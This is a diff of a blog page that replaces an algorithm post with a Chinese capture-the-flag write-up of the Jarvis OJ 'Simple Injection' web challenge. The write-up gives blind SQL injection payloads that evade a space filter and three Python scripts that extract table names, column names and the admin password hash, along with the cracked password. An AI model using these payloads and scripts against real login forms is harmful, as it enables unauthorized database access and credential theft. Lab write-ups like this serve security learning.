@@ -1,5 +1,9 @@
 
 
+  
+    
+  
+
 
   
 
@@ -18,25 +22,26 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Hugo 0.38.1 with theme Tranquilpeak 0.4.3-BETA">
-    <title>Algorithm</title>
+    <title>Writeup Simple Injection</title>
     <meta name="author" content="CLtheorem">
     <meta name="keywords" content="">
 
     <link rel="icon" href="/favicon.png">
     
-      <link rel="alternate" type="application/rss+xml" title="RSS" href="/categories/algorithm/index.xml">
-    
 
     
-    <meta name="description" content="Hugo tranquilpeak theme demo">
-    <meta property="og:description" content="Hugo tranquilpeak theme demo">
+    <meta name="description" content="Jarvis OJ中web题——Simple Injection
+    ">
+    <meta property="og:description" content="Jarvis OJ中web题——Simple Injection
+    ">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="Algorithm">
-    <meta property="og:url" content="/categories/algorithm/">
+    <meta property="og:title" content="Writeup Simple Injection">
+    <meta property="og:url" content="/2018/09/writeup-simple-injection/">
     <meta property="og:site_name" content="CLtheorem">
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="CLtheorem">
-    <meta name="twitter:description" content="Hugo tranquilpeak theme demo">
+    <meta name="twitter:description" content="Jarvis OJ中web题——Simple Injection
+    ">
     
     
 
@@ -71,7 +76,7 @@
 
   <body>
     <div id="blog">
-      <header id="header" data-behavior="1">
+      <header id="header" data-behavior="4">
   <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
   <div class="header-title">
     <a class="header-title-link" href="/">CLtheorem</a>
@@ -91,7 +96,7 @@
   
 </header>
 
-      <nav id="sidebar" data-behavior="1">
+      <nav id="sidebar" data-behavior="4">
   <div class="sidebar-container">
     
       <div class="sidebar-profile">
@@ -180,44 +185,26 @@
 </nav>
 
       
-        
 
-      
-      <div id="main" data-behavior="1"
+      <div id="main" data-behavior="4"
         class="
                hasCoverMetaIn
                ">
-        
-          <section class="postShorten-group main-content-wrap">
-            
-            
-              
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
   
-    
-      
-        
-      
-    
+    <h1 class="post-title" itemprop="headline">
+      Writeup Simple Injection
+    </h1>
   
-
-
   
-
-<article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
-  <div class="postShorten-wrap">
-    
-    <div class="postShorten-header">
-      <h1 class="postShorten-title" itemprop="headline">
-        <a class="link-unstyled" href="/2018/04/huffmancode/">
-          HuffmanCode
-        </a>
-      </h1>
-      
   <div class="postShorten-meta post-meta">
     
-      <time itemprop="datePublished" datetime="2018-04-24T23:10:01&#43;08:00">
+      <time itemprop="datePublished" datetime="2018-09-28T21:09:08&#43;08:00">
         
-  四月 24, 2018
+  九月 28, 2018
 
       </time>
     
@@ -226,38 +213,218 @@
   
     <span>发布在</span>
     
-      <a class="category-link" href="/categories/algorithm">Algorithm</a>, 
-    
-      <a class="category-link" href="/categories/python">Python</a>
+      <a class="category-link" href="/categories/web">Web</a>
     
   
 
   </div>
 
-    </div>
-    <div class="postShorten-excerpt" itemprop="articleBody">
-      <p>赫夫曼编码</p>
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>Jarvis OJ中web题——Simple Injection
+    </p>
 
-<pre><code>对一个字符串进行二进制编码，采用赫夫曼编码原则，可获得总长度最短的编码方案。
+<p>题目链接：<a href="http://web.jarvisoj.com:32787/login.php">http://web.jarvisoj.com:32787/login.php</a></p>
 
-知识点：最优二叉树（赫夫曼树）
+<p>0x00 分析</p>
+
+<pre><code>如题目所言，这是个SQL注入，且是个盲注。
+
+初步探测：username=admin  password=123456 提示密码错误；username=admin123  password=123456 提示用户名错误。
+
+发现用户名和密码出错有着不同的提示信息，可以猜测后台对用户名和密码是分步验证的，且已确定一个合法用户名admin。
+
+尝试构造：username=admin' and 1#  password=123456 提示用户名错误，调试后发现空格被过滤。
+
+可以用注释符/**/替换空格，再构造：username=admin'/**/and/**/1#  password=123456 提示密码错误，说明注入成功
+
+接下来就可以愉快的暴库爆表爆字段了。
 </code></pre>
 
-<p></p>
-      <p>
-        <a href="/2018/04/huffmancode/" class="postShorten-excerpt_link link">阅读全文</a>
+<p>0x01 注入</p>
+
+<pre><code>以下payload省略password。
+
+payload1: username = admin'/**/and/**/length((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()))&gt;1#
+使用二分法可以快速确定length(group_concat(distinct table_name))=5。
+
+知道长度后接下来就可以开始确定具体内容，手工比较麻烦，用python写个脚本：
+</code></pre>
+
+<p><br></p>
+
+<pre><code>import requests
+
+if __name__ == '__main__':
+    url = 'http://web.jarvisoj.com:32787/login.php'
+    # username = &quot;admin'/**/and/**/length((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()))=5#&quot;
+    for i in range(5):
+        for num in range(44, 123):
+            # 偷懒，直接遍历，不用二分法了。
+            username = &quot;admin'/**/and/**/ascii(substr((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()),&quot;+str(i+1)+&quot;,1))=&quot;+str(num)+&quot;#&quot;
+            data = {
+                'username': username,
+                'password': '123'
+            }
+            html = requests.post(url, data=data)
+            if len(html.text)==1191:  # 密码错误时响应内容长度为1191
+                print(chr(num), end='')
+                break
+</code></pre>
+
+<p><br>
+<img src="/post/images/simpleInjection1.JPG" alt="image1" /></p>
+
+<pre><code>得到当前库中只有一张admin表。
+
+获取admin表中的字段名，与上面类似。
+payload3: username=admin'/**/and/**/length((select/**/group_concat(distinct/**/column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='admin'))&gt;1#
+使用二分法可以快速确定length(group_concat(distinct column_name))=20。
+上面的代码稍微改改，获取字段内容：
+</code></pre>
+
+<p><br></p>
+
+<pre><code>import requests
+
+if __name__ == '__main__':
+    url = 'http://web.jarvisoj.com:32787/login.php'
+    # username = &quot;admin'/**/and/**/length((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()))=5#&quot;
+    for i in range(20):
+        for num in range(44, 123):
+            # 偷懒，直接遍历，不用二分法了。
+            # username = &quot;admin'/**/and/**/ascii(substr((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()),&quot;+str(i+1)+&quot;,1))=&quot;+str(num)+&quot;#&quot;
+            # username = &quot;admin'/**/and/**/length((select/**/group_concat(distinct/**/column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='admin'))=20#&quot;
+            username = &quot;admin'/**/and/**/ascii(substr((select/**/group_concat(distinct/**/column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='admin'),&quot;+str(i+1)+&quot;,1))=&quot; + str(num) + &quot;#&quot;
+            data = {
+                'username': username,
+                'password': '123'
+            }
+            html = requests.post(url, data=data)
+            if len(html.text)==1191:  # 密码错误时响应内容长度为1191
+                print(chr(num), end='')
+                break
+</code></pre>
+
+<p><br>
+<img src="/post/images/simpleInjection2.JPG" alt="image1" /></p>
+
+<pre><code>接着获取password字段，同样的方法确定len(password)=32，估计是个md5值，大同小异的代码：
+</code></pre>
+
+<p><br></p>
+
+<pre><code>import requests
+
+if __name__ == '__main__':
+    url = 'http://web.jarvisoj.com:32787/login.php'
+    # username = &quot;admin'/**/and/**/length((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()))=5#&quot;
+    for i in range(32):
+        for num in range(44, 123):
+            # 偷懒，直接遍历，不用二分法了。
+            # username = &quot;admin'/**/and/**/ascii(substr((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()),&quot;+str(i+1)+&quot;,1))=&quot;+str(num)+&quot;#&quot;
+            # username = &quot;admin'/**/and/**/length((select/**/group_concat(distinct/**/column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='admin'))=20#&quot;
+            # username = &quot;admin'/**/and/**/ascii(substr((select/**/group_concat(distinct/**/column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='admin'),&quot;+str(i+1)+&quot;,1))=&quot; + str(num) + &quot;#&quot;
+            # username = &quot;admin'/**/and/**/length((select/**/password/**/from/**/admin))=32#&quot;
+            username = &quot;admin'/**/and/**/ascii(substr((select/**/password/**/from/**/admin),&quot;+str(i+1)+&quot;,1))=&quot;+str(num)+&quot;#&quot;
+            data = {
+                'username': username,
+                'password': '123'
+            }
+            html = requests.post(url, data=data)
+            if len(html.text)==1191:  # 密码错误时响应内容长度为1191
+                print(chr(num), end='')
+                break
+</code></pre>
+
+<p><br></p>
+
+<pre><code>得到password = 334cfb59c9d74849801d5acdcfdaadc3，MD5解密可得到admin账户的登入密码 eTAloCrEP（那个
+username中也就一个admin用户），不过现在这个md5好像成为付费的了╮(╯▽╰)╭
+登陆后即可看到flag
+</code></pre>
+
+<p><br>
+<img src="/post/images/simpleInjection3.JPG" alt="image1" /></p>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="/tags/jarvisoj-writeup/">Jarvisoj-writeup</a>
+
+                  </div>
+                
+              
+            
+            
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/09/%E7%94%A8photoshop%E8%A7%A3%E5%86%B3%E7%9A%84%E4%B8%A4%E9%81%93misc/" data-tooltip="用photoshop解决的两道misc">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
         
-      </p>
-    </div>
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
   </div>
-  
-</article>
+
 
             
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
             
-
-          </section>
-        
+          </div>
+        </article>
         <footer id="footer" class="main-content-wrap">
   <span class="copyrights">
     &copy; 2018 CLtheorem. All Rights Reserved
@@ -265,6 +432,66 @@
 </footer>
 
       </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/09/%E7%94%A8photoshop%E8%A7%A3%E5%86%B3%E7%9A%84%E4%B8%A4%E9%81%93misc/" data-tooltip="用photoshop解决的两道misc">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
     </div>
     
     <div id="about">
@@ -493,6 +720,32 @@ $(document).ready(function() {
 });
 </script>
 
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = '\/2018\/09\/writeup-simple-injection\/';
+          
+            this.page.identifier = '\/2018\/09\/writeup-simple-injection\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'peak';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
 
 
 
